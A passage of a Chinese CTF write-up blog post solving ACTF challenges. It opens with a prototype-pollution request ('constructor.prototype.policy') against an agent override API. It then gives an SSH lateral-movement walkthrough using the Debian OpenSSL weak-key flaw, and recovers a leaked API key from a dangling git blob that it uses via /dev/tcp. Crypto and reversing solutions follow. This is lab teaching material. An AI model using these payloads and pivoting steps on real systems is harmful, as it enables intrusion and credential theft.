class="hljs-string">&quot;/api/projects/workspace-main/agent/override&quot;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: JSON.<span class="hljs-title function_ invoke__">stringify</span>(&#123;<br>    <span class="hljs-attr">instruction</span>: <span class="hljs-string">&quot;evaluate release policy&quot;</span>,<br>    <span class="hljs-attr">scope</span>: <span class="hljs-string">&quot;release&quot;</span>,<br>    <span class="hljs-attr">environment</span>: <span class="hljs-string">&quot;staging&quot;</span>,<br>    <span class="hljs-attr">section</span>: <span class="hljs-string">&quot;image&quot;</span>,<br>    <span class="hljs-attr">field</span>: <span class="hljs-string">&quot;constructor.prototype.policy&quot;</span>,<br>    <span class="hljs-attr">value</span>: &#123;<br>      formula,<br>      <span class="hljs-attr">bindingProfile</span>: <span class="hljs-string">&quot;compat&quot;</span>,<br>      <span class="hljs-attr">resultProfile</span>: <span class="hljs-string">&quot;wide&quot;</span>,<br>      <span class="hljs-attr">selectorProfile</span>: <span class="hljs-string">&quot;catalog&quot;</span>,<br>      <span class="hljs-attr">exposeDebugContext</span>: <span class="hljs-literal">true</span><br>    &#125;,<br>    <span class="hljs-attr">dryRun</span>: <span class="hljs-literal">true</span><br>  &#125;)<br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">data</span> = await res.<span class="hljs-title function_ invoke__">json</span>();<br>console.<span class="hljs-title function_ invoke__">log</span>(data);<br>console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;RESULT =&quot;</span>, data?.job?.result?.evaluation?.formulaResult);<br></code></pre></td></tr></table></figure>
+
+<p>就能拿到 flag </p>
+<h5 id="ACTF-1n-f4c7-∀-D0esn’7-ref3r-2-und3rwe4r-bu7-an-1nVer7ed-A"><a href="#ACTF-1n-f4c7-∀-D0esn’7-ref3r-2-und3rwe4r-bu7-an-1nVer7ed-A" class="headerlink" title="ACTF{1n_f4c7_∀_D0esn’7_ref3r_2_und3rwe4r_bu7_an_1nVer7ed_A}"></a>ACTF{1n_f4c7_∀_D0esn’7_ref3r_2_und3rwe4r_bu7_an_1nVer7ed_A}</h5><h4 id="special-day"><a href="#special-day" class="headerlink" title="special day"></a>special day</h4><p>签到题。</p>
+<p>附件给了base64：SGFwcHkgTW90aGVyJ3MgRGF5LCBNb20h</p>
+<p>就是Happy Mother’s Day, Mom!</p>
+<h5 id="ACTF-Happy-Mothers-Day-Mom"><a href="#ACTF-Happy-Mothers-Day-Mom" class="headerlink" title="ACTF{Happy_Mothers_Day_Mom}"></a>ACTF{Happy_Mothers_Day_Mom}</h5><h4 id="ZJUAM-Just-Uses-Awful-Math"><a href="#ZJUAM-Just-Uses-Awful-Math" class="headerlink" title="ZJUAM Just Uses Awful Math"></a>ZJUAM Just Uses Awful Math</h4><p>流量包里是一次登陆过程</p>
+<p>拿了一个Pubkey，然后有串加密的password</p>
+<p>估计是解这个password。</p>
+<p>password：590948ad2f7a3c0b1a2a5e5f470f4297db3b90623251132be2c5e5395cd12563</p>
+<p>Pubkey ：</p>
+<p>{“modulus”:”90011418f37a7a075aead75a9829d38eb2d750fd17bb24e5861b89d7658a88c3”,”exponent”:”10001”}</p>
+<p>后面是crypto了吧。( •_•)&gt;⌐■-■</p>
+<p>Alpertron Integer Factorization Calculator里面解出来</p>
+<p>p &#x3D; 202555251191383333988748320354737959551</p>
+<p>q &#x3D; 321566364572398185024295275472079273917</p>
+<p>n &#x3D; p * q</p>
+<p>e &#x3D; 65537</p>
+<p>解出来的明文是414354467b544c535f73407665735f5448455f7730524c647d</p>
+<p>也就是</p>
+<h5 id="ACTF-TLS-s-ves-THE-w0RLd"><a href="#ACTF-TLS-s-ves-THE-w0RLd" class="headerlink" title="ACTF{TLS_s@ves_THE_w0RLd}"></a>ACTF{TLS_s@ves_THE_w0RLd}</h5><h4 id="Ezssh"><a href="#Ezssh" class="headerlink" title="Ezssh"></a>Ezssh</h4><p>题目给了个实例申请接口。调用之后返回一台 SSH 主机地址、端口、用户名。</p>
+<p>连接 SSH ，这个 SSH 的密码是用户名 guest 。</p>
+<p>（md，这个密码卡了好久，还以为是在哪里能拿到的）</p>
+<p>然后要输入 team token。</p>
+<p>进入之后拿到了 bastion</p>
+<p>&#x2F;home 下面除了 guest 还有 inuebisu</p>
+<p>在 &#x2F;home&#x2F;inuebisu 里面有 flag1.txt</p>
+<p>但是没有权限读取。</p>
+<p>但是可以读取 &#x2F;home&#x2F;inuebisu&#x2F;.bash_history</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ssh root<span class="hljs-variable">@oldgw</span><br>scp root<span class="hljs-variable">@oldgw</span><span class="hljs-symbol">:/root/</span>.ssh/id_rsa.pub /tmp/oldgw.pub<br>cat /tmp/oldgw.pub &gt;&gt; ~<span class="hljs-regexp">/.ssh/authorized</span>_keys<br>ssh gitops<span class="hljs-variable">@git</span>-<span class="hljs-number">01</span><br>ssh gitops<span class="hljs-variable">@git</span>-<span class="hljs-number">01</span> <span class="hljs-string">&quot;ls /srv/git&quot;</span><br>ssh gitops<span class="hljs-variable">@git</span>-<span class="hljs-number">01</span> <span class="hljs-string">&quot;cd /srv/git/ai-gateway-migration &amp;&amp; git log --oneline -3&quot;</span><br>cat flag1.txt<br></code></pre></td></tr></table></figure>
+
+<p>inuebisu 曾经登录过 oldgw。</p>
+<p>root@oldgw 的公钥被加入了 inuebisu 的 authorized_keys。</p>
+<p>后续还有 git-01 这条线</p>
+<p>发现 authorized_keys 中有一条注释为 root@oldgw 的 RSA 公钥</p>
+<p>同时 &#x2F;tmp&#x2F;oldgw-etc 中有 oldgw 的备份配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /tmp/oldgw-etc -maxdepth 3 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;===== &#123;&#125; =====&#x27;</span> \; -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> &#123;&#125; \;<br></code></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/tmp/</span>oldgw-etc/debian_version: <span class="hljs-number">4.0</span><br><span class="hljs-regexp">/tmp/</span>oldgw-etc/hostname: oldgw<br></code></pre></td></tr></table></figure>
+
+<p>Debian 4.0 加上旧 SSH key 是经典 Debian OpenSSL weak key 线索。</p>
+<p>先保存 root@olddw 的公钥，</p>
+<p>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvMDKzZ6D+MTDUToYDHiRG&#x2F;oC+qcPo0gGNhfPzFnfGIU0em7gP911RUHSsRBi9LGBPo4u2KHSdkBrvh5aDClBCDumoLv&#x2F;UVH2Q9qxxRIQW9uKNMvMNao+Ux30a2MjWM5+KR&#x2F;xGeujO3YYIkJBx9bI5jkipu5l3UhPRjtTxChTe3T7x7bwZEeW9dsV4NtWM2EyQEX21mfAtb1uHQrL5Ce6kweKmBu&#x2F;xR7y5r7GDaygBgGQLVjeqXJ6wLew&#x2F;DPcFcWqMoAULpcUScVZ7F1Rz8AeqLbtZ0fHZbBZVEKgHji2f7K3TwIKe0IfRjICJzaEvHM7SROvEbd7DtVM+lZ1O57Kjw&#x3D;&#x3D;</p>
+<p>查看指纹 2048 MD5:a3:ed:92:9a:9c:89:a7:3f:52:13:7a:ba:c5:56:56:32 root@oldgw (RSA)</p>
+<p>然后通过 Debian OpenSSL 弱密钥库找到私钥。</p>
+<p>直接用这个私钥登陆 inuebisu</p>
+<p>读取第一段 flag ：</p>
+<h5 id="ACTF-O1DGw-N3vER-d-E5"><a href="#ACTF-O1DGw-N3vER-d-E5" class="headerlink" title="ACTF{O1DGw_N3vER_d!E5_"></a>ACTF{O1DGw_N3vER_d!E5_</h5><p>查看 SSH 配置，发现保存着 git-01 的凭证</p>
+<p>于是直接 ssh git-01</p>
+<p>发现 ~&#x2F;flag2.txt ，直接读取拿到第二段：</p>
+<h5 id="h-s70ry-sT-lL-1eaK"><a href="#h-s70ry-sT-lL-1eaK" class="headerlink" title="h!s70ry_sT!lL_1eaK$_"></a>h!s70ry_sT!lL_1eaK$_</h5><p>然后在 这个 git 仓库中寻找。</p>
+<p>这个用户还有一把去 backup_01 的私钥，只支持 SFTP 服务。</p>
+<p>连过去没什么东西</p>
+<p>就一个ai-gateway.service</p>
+<p>内容是：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><br><span class="hljs-attr">Description</span>=Internal AI Gateway<br><br><span class="hljs-attr">After</span>=network.target<br><br><br><br><span class="hljs-section">[Service]</span><br><br><span class="hljs-attr">Type</span>=simple<br><br><span class="hljs-attr">Environment</span>=OPENAI_BASE_URL=http://<span class="hljs-number">10.61</span>.<span class="hljs-number">3.40</span>:<span class="hljs-number">8080</span>/v1<br><br><span class="hljs-attr">Environment</span>=OPENAI_MODEL=deepsleep-v8<br><br><span class="hljs-attr">ExecStart</span>=/usr/local/bin/ai-gateway<br><br><span class="hljs-attr">Restart</span>=always<br><br><br><br><span class="hljs-section">[Install]</span><br><br><span class="hljs-attr">WantedBy</span>=multi-user.targetgitops@git-<span class="hljs-number">01</span>:/srv/git/ai-gateway-migration$ <br><br><br></code></pre></td></tr></table></figure>
+
+<p>其实这个本来的仓库里也有提到，有个 smoke 的思路。</p>
+<p>同时怀疑有悬空提交或者孤儿提交</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">git fsck <span class="hljs-params">--full</span> <span class="hljs-params">--no-reflogs</span> <span class="hljs-params">--unreachable</span> <span class="hljs-params">--lost-found</span> 2&gt;<span class="hljs-string">/dev/null</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">unreachable</span> blob <span class="hljs-number">5</span>b<span class="hljs-number">33</span>ca<span class="hljs-number">2</span>d<span class="hljs-number">50324</span>d<span class="hljs-number">3600</span><span class="hljs-keyword">c</span><span class="hljs-number">315671849e3</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>ea<span class="hljs-number">03</span>bcc<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git show <span class="hljs-number">5</span>b<span class="hljs-number">33</span>ca<span class="hljs-number">2</span>d<span class="hljs-number">50324</span>d<span class="hljs-number">3600</span><span class="hljs-keyword">c</span><span class="hljs-number">315671849e3</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>ea<span class="hljs-number">03</span>bcc<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">OPENAI_API_KEY</span>=sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK<br></code></pre></td></tr></table></figure>
+
+
+
+<p>然后直接给 ai-gateway-01:8080 发请求。</p>
+<p>为什么我这用 curl -sS 显示没有这个命令qaq，但是其他人的 wp 里面可以啊。</p>
+<p>不得已，用 &#x2F;dev&#x2F;tcp 手搓了。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">KEY</span>=&#x27;sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK&#x27;<br><span class="hljs-attribute">BODY</span>=&#x27;&#123;<span class="hljs-string">&quot;model&quot;</span>:<span class="hljs-string">&quot;deepsleep-v8&quot;</span>,<span class="hljs-string">&quot;messages&quot;</span>:[&#123;<span class="hljs-string">&quot;role&quot;</span>:<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;ping&quot;</span>&#125;]&#125;&#x27;<br><br><span class="hljs-attribute">exec</span> <span class="hljs-number">3</span>&lt;&gt;/dev/tcp/<span class="hljs-number">10.61.3.40</span>/<span class="hljs-number">8080</span><br><span class="hljs-attribute">printf</span> &#x27;POST /v1/chat/completions HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\nHost: <span class="hljs-number">10.61.3.40</span>\r\nContent-Type: application/json\r\nAuthorization: Bearer %s\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s&#x27; <span class="hljs-string">&quot;$$KEY&quot;</span> <span class="hljs-string">&quot;$$&#123;#BODY&#125;&quot;</span> <span class="hljs-string">&quot;$BODY&quot;</span> &gt;&amp;<span class="hljs-number">3</span><br><span class="hljs-attribute">cat</span> &lt;&amp;<span class="hljs-number">3</span><br><span class="hljs-attribute">exec</span> <span class="hljs-number">3</span>&gt;&amp;-<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br>HTTP<span class="hljs-symbol">/1.0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-params">Server:</span> BaseHTTP<span class="hljs-symbol">/0.6</span> Python<span class="hljs-symbol">/3.12.13</span><br><span class="hljs-params">Date:</span> Sun, <span class="hljs-number">10</span> May <span class="hljs-number">2026</span> <span class="hljs-number">12</span>:<span class="hljs-number">30</span>:<span class="hljs-number">04</span> GMT<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">169</span><br>&#123;<br>  <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;chatcmpl-final&quot;</span>,<br>  <span class="hljs-string">&quot;object&quot;</span>: <span class="hljs-string">&quot;chat.completion&quot;</span>,<br>  <span class="hljs-string">&quot;choices&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;message&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;assistant&quot;</span>,<br>        <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;@70M1c_b0mBiN9&#125;&quot;</span><br>      &#125;<br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第三段：</p>
+<h5 id="70M1c-b0mBiN9"><a href="#70M1c-b0mBiN9" class="headerlink" title="@70M1c_b0mBiN9}"></a>@70M1c_b0mBiN9}</h5><h5 id="ACTF-O1DGw-N3vER-d-E5-h-s70ry-sT-lL-1eaK-70M1c-b0mBiN9"><a href="#ACTF-O1DGw-N3vER-d-E5-h-s70ry-sT-lL-1eaK-70M1c-b0mBiN9" class="headerlink" title="ACTF{O1DGw_N3vER_d!E5_h!s70ry_sT!lL_1eaK$_@70M1c_b0mBiN9}"></a>ACTF{O1DGw_N3vER_d!E5_h!s70ry_sT!lL_1eaK$_@70M1c_b0mBiN9}</h5><h4 id="计算机系统贯通实验"><a href="#计算机系统贯通实验" class="headerlink" title="计算机系统贯通实验"></a>计算机系统贯通实验</h4><p>附件是个 .xlsx ，实际上是用 excel 表格做了个 Excel CPU，用公式模拟了一套类 RISC-V 指令执行流程</p>
+<p>F4   输入 flag</p>
+<p>F7   reset &#x2F; 控制</p>
+<p>F10  输出</p>
+<p>I列  混淆后的指令</p>
+<p>J列  寄存器</p>
+<p>K&#x2F;L列  内存</p>
+<p>指令列的解码关系大概是：</p>
+<p>instr &#x3D; (int(I[row], 16) - 11462713 * (pc &#x2F;&#x2F; 4) - 918823512) &amp; 0xffffffff</p>
+<p>解码后能看到一套类似 RV32I 的指令集：<code>load/store/branch/jal/jalr/lui/auipc/op/op-imm</code></p>
+<p>程序启动后会打印</p>
+<p>Hi</p>
+<p>begin init</p>
+<p>Checking flag</p>
+<p>主要校验分成四段。</p>
+<p>第一段是自定义 base64。程序用普通 base64 字符表生成了一个置换表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">perm[i] = alphabet[(37 * i + 47) % 64]<br></code></pre></td></tr></table></figure>
+
+<p>用这个表解目标串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">JJY+ndsVry-wWNA9MJYcg5Y0WSIwWi8Ir+rOG-==<br></code></pre></td></tr></table></figure>
+
+<p>得到 flag 的第 35 到 62 位：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">I-cann0t-love-it-anymore233-<br></code></pre></td></tr></table></figure>
+
+<p>第二段是前 35 字节的简单变换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">enc[i] = ((flag[i] ^ 0x37) + 0x2f) &amp; 0xff<br></code></pre></td></tr></table></figure>
+
+<p>逆回去得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">ACTF&#123;do-u-love-General-Physics-(H)?<br></code></pre></td></tr></table></figure>
+
+<p>第三段是 hash 链，循环校验第 63 到 82 位。hash 不是标准 FNV，但形式很像：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Plain">h = 0x811c9dc5<br>for b in data_until_zero:<br>    h ^= b<br>    h = rol32(h, 7)<br>    h = (h + (h &lt;&lt; 13)) &amp; 0xffffffff<br>    h ^= h &gt;&gt; 5<br></code></pre></td></tr></table></figure>
+
+<p>逐对爆破 printable 字符并利用重叠关系，可以得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">15c077f9-631f-44d8-b<br></code></pre></td></tr></table></figure>
+
+<p>第四段是最后 16 字节的块变换，结构像一个简化 AES：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">state ^= first16<br>state ^= key16<br>7 rounds:<br>  S-box<br>  ShiftRows-like permutation<br>  MixColumns-like transform, polynomial 0x1d<br>  round key xor<br></code></pre></td></tr></table></figure>
+
+<p>把最后的目标块逆回去，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">826-af6c60f15e4f<br></code></pre></td></tr></table></figure>
+
+<p>拼起来就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">ACTF&#123;do-u-love-General-Physics-(H)?I-cann0t-love-it-anymore233-15c077f9-631f-44d8-b826-af6c60f15e4f&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="Flag-checker"><a href="#Flag-checker" class="headerlink" title="Flag checker"></a>Flag checker</h4><p>题目结构大概是：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">LoongArch64 Go 静态二进制<br><span class="hljs-bullet">+</span> garble 混淆<br><span class="hljs-bullet">+</span> 反射调用 verifier 方法<br><span class="hljs-bullet">+</span> HMAC-SHA256 派生 per-word key<br><span class="hljs-bullet">+</span> 自定义 4 轮 Feistel<br><span class="hljs-bullet">+</span> mmap 出来的 blob 里做 SM4 校验<br></code></pre></td></tr></table></figure>
+
+<p>关键约束是：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">flag 长度：<span class="hljs-number">38</span><br>格式：ACTF&#123;<span class="hljs-number">32</span>字节<span class="hljs-keyword">body</span>&#125;<br><span class="hljs-keyword">body</span> 是 <span class="hljs-number">32</span> 位小写 hex 字符串<br></code></pre></td></tr></table></figure>
+
+<p>真正校验函数是由前缀 <code>ACTF{</code> 算出来的：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">base32</span><span class="hljs-params">(sha256(<span class="hljs-string">&quot;ACTF&#123;&quot;</span>)</span></span><span class="hljs-selector-attr">[:5]</span>) = CT77IKGJ<br></code></pre></td></tr></table></figure>
+
+<p>所以进入的方法是：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>.(*JGqVVFpm)<span class="hljs-selector-class">.CT77IKGJ</span><br></code></pre></td></tr></table></figure>
+
+<p>最后的主逻辑是把 body 切成 8 个 little-endian <code>uint32</code>，然后通过 8 个 goroutine&#x2F;channel 打乱依赖关系。每个 word 的 Feistel key 来自另一个 word 的：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">first4</span><span class="hljs-params">(HMAC-SHA256(<span class="hljs-string">&quot;DragonAbyssLoong64ReverseCTF2026&quot;</span>, word_bytes)</span></span>)<br></code></pre></td></tr></table></figure>
+
+<p>Feistel 后的 32 字节再进入 mmap blob 里的 SM4。SM4 key 是：</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">LoongArch64SM4!!<br></code></pre></td></tr></table></figure>
+
+<p>目标密文是：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">47431</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>eca<span class="hljs-number">012e7</span>a<span class="hljs-number">3</span>a<span class="hljs-number">6</span>ff<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">3807</span>a<span class="hljs-number">168</span>de<span class="hljs-number">2</span>ed<span class="hljs-number">5</span>b<span class="hljs-number">5</span>b<span class="hljs-number">8026866</span>fc<span class="hljs-number">8</span>ba<span class="hljs-number">4460320308</span>fe<br></code></pre></td></tr></table></figure>
+
+<p>解密后得到中间目标：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">018f4771d52fb3b970bcdace9ef3e24bc1926f9bb054537ef00ba5e1efda4801<br></code></pre></td></tr></table></figure>
+
+<p>然后因为 body 只允许 hex 字符，每 4 字节只有 <code>16^4 = 65536</code> 种可能，直接建 8 个转移表，解一个 8-word 环就能出结果。</p>
+<h5 id="ACTF-fce553ec44532f11ff209e1213c92acd"><a href="#ACTF-fce553ec44532f11ff209e1213c92acd" class="headerlink" title="ACTF{fce553ec44532f11ff209e1213c92acd}"></a>ACTF{fce553ec44532f11ff209e1213c92acd}</h5>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/happy-birthday/" title="happy_birthday">
+                        <span class="hidden-mobile">happy_birthday</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="module">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.css')
+      import('https://cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.js').then(({ init }) => {
+        var options = Object.assign(
+          {"serverURL":"https://mu2heblogc.vercel.app","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":[1,500],"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        init(options);
+        Fluid.utils.waitElementVisible('#waline .wl-content', () => {
+          var imgSelector = '#waline .wl-content img:not(.wl-emoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
